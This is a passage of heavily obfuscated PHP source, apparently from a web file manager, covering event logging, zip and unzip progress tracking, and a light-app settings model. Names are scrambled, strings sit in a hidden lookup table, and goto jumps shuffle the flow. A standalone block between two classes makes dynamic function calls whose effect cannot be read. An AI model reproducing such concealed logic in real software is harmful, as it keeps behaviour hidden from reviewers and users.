($fÇ÷Ü…ÌÏ¼ && is_string($fÇ÷Ü…ÌÏ¼)) { $fÇ÷Ü…ÌÏ¼ = array($bÅäóÂãî[2098] => $fÇ÷Ü…ÌÏ¼); } goto DÂ´™±ŞÛª; A®—±•ª¦é: } private function addSystemLog($cÓï‚ä¦’Ï, $dƒ‚„Ë«£˜) { $d–¶ìïˆÂ =& $_SERVER[õëù©û]; if ($cÓï‚ä¦’Ï == $d–¶ìïˆÂ[2235]) { $cÓï‚ä¦’Ï = $dƒ‚„Ë«£˜[$d–¶ìïˆÂ[400]][$d–¶ìïˆÂ[2236]]; } else { if (in_array($cÓï‚ä¦’Ï, array($d–¶ìïˆÂ[2045], $d–¶ìïˆÂ[2237]))) { $cÓï‚ä¦’Ï = $dƒ‚„Ë«£˜[$d–¶ìïˆÂ[400]][$d–¶ìïˆÂ[687]]; } } $E˜òèÍùÀ = array_merge($dƒ‚„Ë«£˜, array($d–¶ìïˆÂ[2238] => $dƒ‚„Ë«£˜[$d–¶ìïˆÂ[365]], $d–¶ìïˆÂ[2239] => $dƒ‚„Ë«£˜[$d–¶ìïˆÂ[2239]])); Model($d–¶ìïˆÂ[2009])->addLog($d–¶ìïˆÂ[2240] . $cÓï‚ä¦’Ï, $E˜òèÍùÀ); } private function isCacheEvent($C’ÑÙŒàïä, $A½Ü¡ÖÙÛ§) { if ($C’ÑÙŒàïä[$_SERVER[õëù©û][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F×“†ÀÀÈ½, $A¬ É©¶…ˆ) { $aÈ®‰øœ =& $_SERVER[õëù©û]; $b“íº÷çÓõ = Model($aÈ®‰øœ[1101])->sourceInfo($F×“†ÀÀÈ½); $BÇŠ‘Ú˜œë = array($aÈ®‰øœ[2236] => $A¬ É©¶…ˆ, $aÈ®‰øœ[28] => $b“íº÷çÓõ[$aÈ®‰øœ[28]]); return $this->addEvent($F×“†ÀÀÈ½, $aÈ®‰øœ[2235], $BÇŠ‘Ú˜œë); } public function eventFileEdit($B©‘îÂŸß”) { $cÔ¹ÄÚ¿ŠÙ =& $_SERVER[õëù©û]; $e××›…ÈÓÚ = array($cÔ¹ÄÚ¿ŠÙ[2241] => $_SERVER[$cÔ¹ÄÚ¿ŠÙ[2242]], $cÔ¹ÄÚ¿ŠÙ[1715] => strtolower(ACTION)); return $this->addEvent($B©‘îÂŸß”, $cÔ¹ÄÚ¿ŠÙ[2036], $e××›…ÈÓÚ); } public function eventRecycle($Còå’ë¿, $C×½³›Æ) { return $this->addEvent($Còå’ë¿, $_SERVER[õëù©û][2237], $C×½³›Æ); } public function eventRemove($A¦õÁáò‰) { $a÷Íµªèö­ =& $_SERVER[õëù©û]; $aÔäò®–ò» = Model($a÷Íµªèö­[1101])->sourceInfo($A¦õÁáò‰); $EˆàãÓ‡ñê = $aÔäò®–ò»[$a÷Íµªèö­[28]]; return $this->addEvent($aÔäò®–ò»[$a÷Íµªèö­[456]], $a÷Íµªèö­[2035], $EˆàãÓ‡ñê); } public function eventShare($A¦¼–˜‘, $f †»êÏà…) { return $this->addEvent($A¦¼–˜‘, $_SERVER[õëù©û][2045], $f †»êÏà…); } public function eventMove($fÑ‰°Õá™², $a’¸¿‚ÏÈ², $A×‰ˆê‰´) { goto D¨¢¶àîÊ; BÛî›ò´Õ: $this->addEvent($fÑ‰°Õá™², $fçëÃµñÒä[487], $EÂäå¼ˆÈ); $a¤ºÊ­ÌÌ« = $A÷††¥¿Øğ->sourceInfo($fÑ‰°Õá™²); $EÂäå¼ˆÈ = array($fçëÃµñÒä[365] => $a¤ºÊ­ÌÌ«[$fçëÃµñÒä[365]], $fçëÃµñÒä[28] => $a¤ºÊ­ÌÌ«[$fçëÃµñÒä[28]]); goto bé®“‘Šğé; bé®“‘Šğé: $this->addEvent($a’¸¿‚ÏÈ², $fçëÃµñÒä[2247], $EÂäå¼ˆÈ); goto aµÍ„ù÷ô½; A¯™ªˆŒá¯: $A¯ŸŒÉ¢Üµ = $A÷††¥¿Øğ->sourceInfo($a’¸¿‚ÏÈ²); $Cµ¾‚¾Èà† = $A÷††¥¿Øğ->sourceInfo($A×‰ˆê‰´); $EÂäå¼ˆÈ = array($fçëÃµñÒä[997] => $a’¸¿‚ÏÈ², $fçëÃµñÒä[2243] => $A¯ŸŒÉ¢Üµ[$fçëÃµñÒä[28]], $fçëÃµñÒä[2244] => $A¯ŸŒÉ¢Üµ[$fçëÃµñÒä[461]], $fçëÃµñÒä[998] => $A×‰ˆê‰´, $fçëÃµñÒä[2245] => $Cµ¾‚¾Èà†[$fçëÃµñÒä[28]], $fçëÃµñÒä[2246] => $Cµ¾‚¾Èà†[$fçëÃµñÒä[461]]); goto BÛî›ò´Õ; D¨¢¶àîÊ: $fçëÃµñÒä =& $_SERVER[õëù©û]; $A÷††¥¿Øğ = Model($fçëÃµñÒä[1101]); $a¤ºÊ­ÌÌ« = $A÷††¥¿Øğ->sourceInfo($fÑ‰°Õá™²); goto A¯™ªˆŒá¯; aµÍ„ù÷ô½: } public function eventCopy($CÌ®é¯Û‰Ú) { $this->eventCreate($CÌ®é¯Û‰Ú, $_SERVER[õëù©û][485]); } public function eventRename($BÊ…’Û²¶, $d ÉáóªØÊ, $B‡”Êç·‰) { $dµóªŒ÷èÏ =& $_SERVER[õëù©û]; $E­Ô¦ù± = array($dµóªŒ÷èÏ[997] => $d ÉáóªØÊ, $dµóªŒ÷èÏ[998] => $B‡”Êç·‰); return $this->addEvent($BÊ…’Û²¶, $dµóªŒ÷èÏ[1113], $E­Ô¦ù±); } public function eventAddComment($dâ×à°¸Õ¥, $aÙ•‹†»ÈÁ) { return $this->addEvent($dâ×à°¸Õ¥, $_SERVER[õëù©û][2248], $aÙ•‹†»ÈÁ); } public function eventAddDesc($AÏİÌâÇ®ì, $bÛ¥¬Ğ£ßÔ) { return $this->addEvent($AÏİÌâÇ®ì, $_SERVER[õëù©û][2249], $bÛ¥¬Ğ£ßÔ); } public function listBySource($Böšî‡Œ) { goto fŸˆÏÅ´Ï; fŸˆÏÅ´Ï: $Fß©…ëÜ– =& $_SERVER[õëù©û]; $a†»»Ëä½… = Model($Fß©…ëÜ–[1101])->sourceInfo($Böšî‡Œ); $a©¹Ÿ•‡ë = array($Fß©…ëÜ–[379] => $Böšî‡Œ); goto C§æÙÜª¤Æ; B´Ÿ©•†°Ğ: $DÕ™İ£”Î’ = $this->eventListParse($DÕ™İ£”Î’, $Böšî‡Œ); show_json($DÕ™İ£”Î’); goto a±¤æ¯…ï; C§æÙÜª¤Æ: if ($a†»»Ëä½…[$Fß©…ëÜ–[366]] == $Fß©…ëÜ–[83]) { $B„ï„ –… = Model($Fß©…ëÜ–[1101])->listSearchChildren($Böšî‡Œ, 20000); $B„ï„ –…[] = $Böšî‡Œ . $Fß©…ëÜ–[357]; $a©¹Ÿ•‡ë = array($Fß©…ëÜ–[365] => array($Fß©…ëÜ–[7], $B„ï„ –…)); } $DÕ™İ£”Î’ = $this->where($a©¹Ÿ•‡ë)->order($Fß©…ëÜ–[2250])->selectPage(); if ($DÕ™İ£”Î’[$Fß©…ëÜ–[347]][$Fß©…ëÜ–[348]] == 0) { $DÕ™İ£”Î’[$Fß©…ëÜ–[347]][$Fß©…ëÜ–[348]] = 1; $DÕ™İ£”Î’[$Fß©…ëÜ–[350]] = array(array($Fß©…ëÜ–[379] => $Böšî‡Œ, $Fß©…ëÜ–[2233] => $a†»»Ëä½…[$Fß©…ëÜ–[456]], $Fß©…ëÜ–[1395] => $a†»»Ëä½…[$Fß©…ëÜ–[374]], $Fß©…ëÜ–[384] => $Fß©…ëÜ–[2251], $Fß©…ëÜ–[385] => $a†»»Ëä½…[$Fß©…ëÜ–[183]], $Fß©…ëÜ–[1397] => $Fß©…ëÜ–[33])); } goto B´Ÿ©•†°Ğ; a±¤æ¯…ï: } private function eventListParse($eÃ‚Ş„ğ¸Ç, $e­×ÙŸò¸Æ) { goto D¨‚æ©È‡„; A¤ˆë‚–¹: return $eÃ‚Ş„ğ¸Ç; goto d£Æßµ‘åÖ; DĞŞÁ•¸ô: $Bå’“»ÎÜ„ = array_unique($Bå’“»ÎÜ„); $D¤ö½¥çŠÈ = array_unique(array_to_keyvalue($B°ÎØ®ò, $d‚œíÙ‚Ê[33], $d‚œíÙ‚Ê[1404])); $F‹äÒÈ¿… = Model($d‚œíÙ‚Ê[472])->userListInfo($D¤ö½¥çŠÈ); goto bñ´Í¡äš; bñ´Í¡äš: $CÉ»ŠÚìœ† = Model($d‚œíÙ‚Ê[747])->sourceListInfo($Bå’“»ÎÜ„, !0); foreach ($B°ÎØ®ò as &$Dñà¾ÉÍœ‹) { if ($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[29]] == $d‚œíÙ‚Ê[487] && isset($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[997]])) { $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[997]] = $CÉ»ŠÚìœ†[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[997]]]; $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[998]] = $CÉ»ŠÚìœ†[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[998]]]; } if ($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[29]] == $d‚œíÙ‚Ê[2247] && isset($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[365]])) { $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[365]] = $CÉ»ŠÚìœ†[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]][$d‚œíÙ‚Ê[365]]]; } $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[387]] = $CÉ»ŠÚìœ†[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[365]]]; $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2252]] = $CÉ»ŠÚìœ†[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2239]]]; if ($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[29]] == $d‚œíÙ‚Ê[2035]) { $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2252]] = $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[387]]; $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2239]] = $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2252]][$d‚œíÙ‚Ê[365]]; $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[387]] = !1; $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[365]] = $d‚œíÙ‚Ê[33]; } $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[2205]] = $F‹äÒÈ¿…[$Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[1404]]]; } $eÃ‚Ş„ğ¸Ç[$d‚œíÙ‚Ê[350]] = $B°ÎØ®ò; goto A¤ˆë‚–¹; càÉ¹Šë¹Â: $AË¡ö–‡Î = array_to_keyvalue($B°ÎØ®ò, $d‚œíÙ‚Ê[33], $d‚œíÙ‚Ê[2239]); foreach ($B°ÎØ®ò as $Dñà¾ÉÍœ‹) { $c¤‡Ä—³Üœ = $Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[400]]; if ($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[29]] == $d‚œíÙ‚Ê[487] && isset($c¤‡Ä—³Üœ[$d‚œíÙ‚Ê[997]])) { $Bå’“»ÎÜ„[] = $c¤‡Ä—³Üœ[$d‚œíÙ‚Ê[997]] . $d‚œíÙ‚Ê[33]; $Bå’“»ÎÜ„[] = $c¤‡Ä—³Üœ[$d‚œíÙ‚Ê[998]] . $d‚œíÙ‚Ê[33]; } if ($Dñà¾ÉÍœ‹[$d‚œíÙ‚Ê[29]] == $d‚œíÙ‚Ê[2247] && isset($c¤‡Ä—³Üœ[$d‚œíÙ‚Ê[365]])) { $Bå’“»ÎÜ„[] = $c¤‡Ä—³Üœ[$d‚œíÙ‚Ê[365]] . $d‚œíÙ‚Ê[33]; } } $Bå’“»ÎÜ„ = array_merge($Bå’“»ÎÜ„, $AË¡ö–‡Î, array($e­×ÙŸò¸Æ . $d‚œíÙ‚Ê[33])); goto DĞŞÁ•¸ô; D¨‚æ©È‡„: $d‚œíÙ‚Ê =& $_SERVER[õëù©û]; $B°ÎØ®ò = $eÃ‚Ş„ğ¸Ç[$d‚œíÙ‚Ê[350]]; $Bå’“»ÎÜ„ = array_to_keyvalue($B°ÎØ®ò, $d‚œíÙ‚Ê[33], $d‚œíÙ‚Ê[365]); goto càÉ¹Šë¹Â; d£Æßµ‘åÖ: } public function removeBySource($bÈóÂ‚ª©) { $a´¸½Áè = array($_SERVER[õëù©û][379] => $bÈóÂ‚ª©); $this->where($a´¸½Áè)->remove(); } } goto Dç£Ù‘¬¹°; dâìÑá¹†“: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto a¡ˆ³­Ÿ×é; a¡ˆ³­Ÿ×é: $C«É¶é©ÔÖ =& $_SERVER[õëù©û]; parent::startAfter(); Hook::bind($C«É¶é©ÔÖ[1469], array($this, $C«É¶é©ÔÖ[1470])); goto a˜÷¸˜öâ‰; a˜÷¸˜öâ‰: Hook::bind($C«É¶é©ÔÖ[1026], array($this, $C«É¶é©ÔÖ[1471])); $fƒĞãˆˆæ÷ =& $this->task; $fƒĞãˆˆæ÷[$C«É¶é©ÔÖ[1472]] = $C«É¶é©ÔÖ[1031]; goto bÜ¯‘¿£ô; bÜ¯‘¿£ô: if (!$fƒĞãˆˆæ÷[$C«É¶é©ÔÖ[1310]]) { $fƒĞãˆˆæ÷[$C«É¶é©ÔÖ[1310]] = LNG($C«É¶é©ÔÖ[1473]); } goto b–†ÓÔ‚Ê; b–†ÓÔ‚Ê: } protected function endAfter() { $båÕÙ±—áÕ =& $_SERVER[õëù©û]; parent::endAfter(); Hook::unbind($båÕÙ±—áÕ[1469], array($this, $båÕÙ±—áÕ[1470])); Hook::unbind($båÕÙ±—áÕ[1026], array($this, $båÕÙ±—áÕ[1471])); } public function updateAfter() { $c°÷«ãØğ° =& $_SERVER[õëù©û]; $A¦Š—ì³‡‡ =& $this->task; if (!$A¦Š—ì³‡‡[$c°÷«ãØğ°[969]] || !$A¦Š—ì³‡‡[$c°÷«ãØğ°[693]]) { return; } if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1472]] == $c°÷«ãØğ°[1031]) { $B…ÙìÓ°  = 0; if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1449]]) { $B…ÙìÓ°  = $A¦Š—ì³‡‡[$c°÷«ãØğ°[1450]] / $A¦Š—ì³‡‡[$c°÷«ãØğ°[1449]]; } $A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]] = $B…ÙìÓ°  * 0.3; } else { if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1472]] == $c°÷«ãØğ°[297]) { $B…ÙìÓ°  = $A¦Š—ì³‡‡[$c°÷«ãØğ°[981]] / $A¦Š—ì³‡‡[$c°÷«ãØğ°[969]]; $A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]] = 0.3 + $B…ÙìÓ°  * 0.4; } else { if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1472]] == $c°÷«ãØğ°[102]) { $bëÃ“ôêóƒ = 0; if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1451]] == $c°÷«ãØğ°[102]) { $bëÃ“ôêóƒ = $A¦Š—ì³‡‡[$c°÷«ãØğ°[1450]]; } $B…ÙìÓ°  = ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1454]] + $bëÃ“ôêóƒ) / $A¦Š—ì³‡‡[$c°÷«ãØğ°[693]]; $A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]] = 0.3 + 0.4 + $B…ÙìÓ°  * 0.3; } } } if ($A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]] > 0) { $B’Æ†ëœ”ª = timeFloat() - $A¦Š—ì³‡‡[$c°÷«ãØğ°[1407]] - $A¦Š—ì³‡‡[$c°÷«ãØğ°[1410]]; $A¦Š—ì³‡‡[$c°÷«ãØğ°[1411]] = $B’Æ†ëœ”ª * (1 - $A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]]) / $A¦Š—ì³‡‡[$c°÷«ãØğ°[1405]]; } } public function addFile($fìç‘™Œö) { goto bœ¸å„Œ¨Œ; E‡ëš¹†¶Û: $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[1447]] = $a»†ã…ÈÙ[$FØÇ«´›Š‘[28]]; $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[1449]] = $a»†ã…ÈÙ[$FØÇ«´›Š‘[77]]; $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[1450]] = 0; goto fê›Ë‘Ÿ³„; bœ¸å„Œ¨Œ: $FØÇ«´›Š‘ =& $_SERVER[õëù©û]; $E¾ªŒè‹›Ì =& $this->task; $a»†ã…ÈÙ = IO::info($fìç‘™Œö); goto E‡ëš¹†¶Û; d¥ÃÊÕÃ‡½: $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[969]] = 1; $d‚×‡®É = 0; $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[1455]] = array($FØÇ«´›Š‘[1456] => $d‚×‡®É + 1, $FØÇ«´›Š‘[382] => $a»†ã…ÈÙ[$FØÇ«´›Š‘[28]], $FØÇ«´›Š‘[75] => $a»†ã…ÈÙ[$FØÇ«´›Š‘[75]], $FØÇ«´›Š‘[461] => $a»†ã…ÈÙ[$FØÇ«´›Š‘[461]] ? $a»†ã…ÈÙ[$FØÇ«´›Š‘[461]] : $a»†ã…ÈÙ[$FØÇ«´›Š‘[75]]); goto d±Ø¥À¥ã; d±Ø¥À¥ã: $this->update(); goto c–³íÉ; fê›Ë‘Ÿ³„: $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[971]] = $FØÇ«´›Š‘[1462]; $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[1451]] = $FØÇ«´›Š‘[1031]; $E¾ªŒè‹›Ì[$FØÇ«´›Š‘[693]] = $a»†ã…ÈÙ[$FØÇ«´›Š‘[77]]; goto d¥ÃÊÕÃ‡½; c–³íÉ: } public function unzipAfter($Fâ‡¯ÀŸÅ) { goto EÎ²®àŠœ÷; aËß¾ºåóˆ: $bêÅŠ¼çé = IO::infoWithChildren($Fâ‡¯ÀŸÅ); $BœêÄ¬‹Ó£ = 0; $DÄùØ‚…îŠ[$dêš³´çÂ[1455]] = array($dêš³´çÂ[1456] => $BœêÄ¬‹Ó£ + 1, $dêš³´çÂ[382] => $bêÅŠ¼çé[$dêš³´çÂ[28]], $dêš³´çÂ[75] => $bêÅŠ¼çé[$dêš³´çÂ[75]], $dêš³´çÂ[461] => $bêÅŠ¼çé[$dêš³´çÂ[461]] ? $bêÅŠ¼çé[$dêš³´çÂ[461]] : $bêÅŠ¼çé[$dêš³´çÂ[75]]); goto Eôµ±£²îõ; EÎ²®àŠœ÷: $dêš³´çÂ =& $_SERVER[õëù©û]; $DÄùØ‚…îŠ =& $this->task; $DÄùØ‚…îŠ[$dêš³´çÂ[1472]] = $dêš³´çÂ[102]; goto aËß¾ºåóˆ; bÛ‡ÆËôÕõ: $DÄùØ‚…îŠ[$dêš³´çÂ[981]] = 0; $DÄùØ‚…îŠ[$dêš³´çÂ[1449]] = 0; $DÄùØ‚…îŠ[$dêš³´çÂ[1450]] = 0; goto dŞ½Íäî‰; d¢Îéå¼¢£: $this->update(); self::log($dêš³´çÂ[1474] . json_encode(array($DÄùØ‚…îŠ, $bêÅŠ¼çé))); goto DÂ©—ó„ç®; Eôµ±£²îõ: if ($bêÅŠ¼çé[$dêš³´çÂ[29]] == $dêš³´çÂ[163]) { $DÄùØ‚…îŠ[$dêš³´çÂ[969]] = 1; } else { $DÄùØ‚…îŠ[$dêš³´çÂ[969]] = $bêÅŠ¼çé[$dêš³´çÂ[80]][$dêš³´çÂ[78]]; } $DÄùØ‚…îŠ[$dêš³´çÂ[971]] = $dêš³´çÂ[33]; $DÄùØ‚…îŠ[$dêš³´çÂ[1451]] = 0; goto bÛ‡ÆËôÕõ; dŞ½Íäî‰: $DÄùØ‚…îŠ[$dêš³´çÂ[1447]] = $dêš³´çÂ[33]; $DÄùØ‚…îŠ[$dêš³´çÂ[1454]] = 0; $DÄùØ‚…îŠ[$dêš³´çÂ[693]] = $bêÅŠ¼çé[$dêš³´çÂ[77]]; goto d¢Îéå¼¢£; DÂ©—ó„ç®: } public function nameParse($FíŠë—®ÌÑ) { goto Açâ¦èƒ¨¿; Açâ¦èƒ¨¿: $Fã¼ÇÂÀË =& $_SERVER[õëù©û]; $f¿©‘ˆ‰ =& $this->task; if ($f¿©‘ˆ‰[$Fã¼ÇÂÀË[1472]] == $Fã¼ÇÂÀË[1031]) { $f¿©‘ˆ‰[$Fã¼ÇÂÀË[1472]] = $Fã¼ÇÂÀË[297]; $f¿©‘ˆ‰[$Fã¼ÇÂÀË[1454]] = 0; $f¿©‘ˆ‰[$Fã¼ÇÂÀË[693]] = 0; } goto d¯Âá’†å; d¯Âá’†å: $e¦œÕ¢óÜ¼ = get_path_this($FíŠë—®ÌÑ); if (strstr($e¦œÕ¢óÜ¼, $Fã¼ÇÂÀË[91])) { $f¿©‘ˆ‰[$Fã¼ÇÂÀË[981]] += 1; $f¿©‘ˆ‰[$Fã¼ÇÂÀË[969]] += 1; } $f¿©‘ˆ‰[$Fã¼ÇÂÀË[1447]] = $FíŠë—®ÌÑ; goto c‘Œˆ½¦¸Ù; c‘Œˆ½¦¸Ù: $this->update(); goto C¥ø¥«°Îù; C¥ø¥«°Îù: } } if ($_SERVER[$_SERVER[õëù©û][781]] != $_SERVER[$_SERVER[õëù©û][1335]]) { goto A„‚‰”‚‰; A„‚‰”‚‰: $AÛ‰íµä­ = $_SERVER[õëù©û][784]; $F‰Õ¿„§šÚ = $_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]; $b£œîÏ¡Ğë = $AÛ‰íµä­($F‰Õ¿„§šÚ); goto càÏ…Éôòè; CÈÆæƒ°ÏÙ: $DìÀÉ„®†ñ($_SERVER[$_SERVER[õëù©û][782]]); goto fåµÅÁ£¯¨; càÏ…Éôòè: $E£Ú³ÄèÌë = explode($_SERVER[õëù©û][213], $b£œîÏ¡Ğë); if (count($E£Ú³ÄèÌë) < $_SERVER[õëù©û][555]) { $DÓ×¬Ëªµö = $_SERVER[õëù©û][787]; $DÓ×¬Ëªµö(); } $DìÀÉ„®†ñ = $_SERVER[õëù©û][1475]; goto CÈÆæƒ°ÏÙ; fåµÅÁ£¯¨: } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a‘”˜àÚÂÓ =& $_SERVER[õëù©û]; parent::startAfter(); Hook::bind($a‘”˜àÚÂÓ[1476], array($this, $a‘”˜àÚÂÓ[1470])); $D²ÊÅ¹Â· =& $this->task; $D²ÊÅ¹Â·[$a‘”˜àÚÂÓ[1472]] = $a‘”˜àÚÂÓ[1031]; if (!$D²ÊÅ¹Â·[$a‘”˜àÚÂÓ[1310]]) { $D²ÊÅ¹Â·[$a‘”˜àÚÂÓ[1310]] = LNG($a‘”˜àÚÂÓ[1477]); } } protected function endAfter() { $c¾©·å˜ªã =& $_SERVER[õëù©û]; parent::endAfter(); Hook::unbind($c¾©·å˜ªã[1476], array($this, $c¾©·å˜ªã[1470])); } public function updateAfter() { $dÃ“¾‚Èµ =& $_SERVER[õëù©û]; $fêÃ ô¡Ü =& $this->task; if (!$fêÃ ô¡Ü[$dÃ“¾‚Èµ[969]] || !$fêÃ ô¡Ü[$dÃ“¾‚Èµ[693]]) { return; } if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1472]] == $dÃ“¾‚Èµ[1031]) { $bÓšä²ÁŸ = $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1450]]; if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1451]] != $dÃ“¾‚Èµ[1031]) { $bÓšä²ÁŸ = 0; } $d½ô¦Ù¥÷† = ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1454]] + $bÓšä²ÁŸ) / $fêÃ ô¡Ü[$dÃ“¾‚Èµ[693]]; $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]] = $d½ô¦Ù¥÷† * 0.3; } else { if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1472]] == $dÃ“¾‚Èµ[297]) { $d½ô¦Ù¥÷† = $fêÃ ô¡Ü[$dÃ“¾‚Èµ[981]] / $fêÃ ô¡Ü[$dÃ“¾‚Èµ[969]]; $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]] = 0.3 + $d½ô¦Ù¥÷† * 0.5; } else { if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1472]] == $dÃ“¾‚Èµ[102]) { $d½ô¦Ù¥÷† = 0; if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1449]]) { $d½ô¦Ù¥÷† = $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1450]] / $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1449]]; } $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]] = 0.3 + 0.5 + $d½ô¦Ù¥÷† * 0.2; } } } if ($fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]] > 0) { $f¾í‹¼§Ë¨ = timeFloat() - $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1407]] - $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1410]]; $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1411]] = $f¾í‹¼§Ë¨ * (1 - $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]]) / $fêÃ ô¡Ü[$dÃ“¾‚Èµ[1405]]; } } public function copyFileStart($eóÁÙ¬‡±Æ, $e¿§„ğÓ­â, $fÎ¡¥³™ô, $aÅ‡£çÌ , $F§Ì›œóÀÜ, $D®•åä„‚) { $A¦ˆ™Íê¶ =& $_SERVER[õëù©û]; parent::copyFileStart($eóÁÙ¬‡±Æ, $e¿§„ğÓ­â, $fÎ¡¥³™ô, $aÅ‡£çÌ , $F§Ì›œóÀÜ, $D®•åä„‚); $B¥…É¦¢®’ =& $this->task; if ($B¥…É¦¢®’[$A¦ˆ™Íê¶[1472]] == $A¦ˆ™Íê¶[297]) { $B¥…É¦¢®’[$A¦ˆ™Íê¶[1472]] = $A¦ˆ™Íê¶[102]; } $this->update(); } public function copyFileEnd($aêëÆù’ôõ, $DÛØ†“²ªÛ, $A£ĞõÓˆ†, $E¿ëÙ‚ã§‹, $b”‰…¿Ğ, $D ëáøÜ) { $B™¼­”½ˆ =& $_SERVER[õëù©û]; $aØ¿¯ì›ë¿ =& $this->task; $aØ¿¯ì›ë¿[$B™¼­”½ˆ[1450]] = $aØ¿¯ì›ë¿[$B™¼­”½ˆ[1449]]; $aØ¿¯ì›ë¿[$B™¼­”½ˆ[1454]] += $aØ¿¯ì›ë¿[$B™¼­”½ˆ[1449]]; $aØ¿¯ì›ë¿[$B™¼­”½ˆ[1451]] = $B™¼­”½ˆ[33]; $this->update(); } public function nameParse($DÙ½ÜÆÚÀ¦) { $a¢ä¯‘ÛÌ =& $_SERVER[õëù©û]; $b¬ŠîµƒØ‰ =& $this->task; if ($b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[981]] < $b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[969]]) { $EãÑŠÌ¶ÆĞ = get_path_this($DÙ½ÜÆÚÀ¦); if (strstr($EãÑŠÌ¶ÆĞ, $a¢ä¯‘ÛÌ[91])) { $b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[981]] += 1; } } if ($b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[1472]] == $a¢ä¯‘ÛÌ[1031]) { $b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[1472]] = $a¢ä¯‘ÛÌ[297]; } $b¬ŠîµƒØ‰[$a¢ä¯‘ÛÌ[1447]] = $DÙ½ÜÆÚÀ¦; $this->update(); } } goto EÂÚÛ×Œ’; D­†´ö´Èø: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x4c\x69\147\x68\x74\x41\x70\x70"; public $modelType = "\x53\x79\163\x74\145\x6d\x4f\160\x74\151\157\156"; public $field = array("\x6e\x61\155\145", "\147\162\x6f\x75\x70", "\x64\x65\163\143", "\x63\157\x6e\x74\145\156\x74"); public function listData($BßšĞöˆî… = false, $dÏªç‰‘É™ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\145", $a»º¶²­É = true) { return parent::listData($BßšĞöˆî…, $dÏªç‰‘É™, $a»º¶²­É); } public function remove($fƒí¸ÒˆÉ) { $aÈòÓ’ = $this->findByName($fƒí¸ÒˆÉ); if (!$aÈòÓ’) { return !1; } return parent::remove($aÈòÓ’[$_SERVER[õëù©û][363]]); } public function add($A­³êÓ„ ®) { if ($this->findByName($A­³êÓ„ ®[$_SERVER[õëù©û][28]])) { return !1; } return parent::insert($A­³êÓ„ ®); } public function update($e’×§ø„†¢, $bç¼¦ÈÉ«£) { $BÎ©‚Â“îÔ =& $_SERVER[õëù©û]; $F ·‰Ø‰åŞ = $this->findByName($e’×§ø„†¢); $A«•”Ò¯„˜ = $this->findByName($bç¼¦ÈÉ«£[$BÎ©‚Â“îÔ[28]]); if (!$F ·‰Ø‰åŞ || $A«•”Ò¯„˜ && 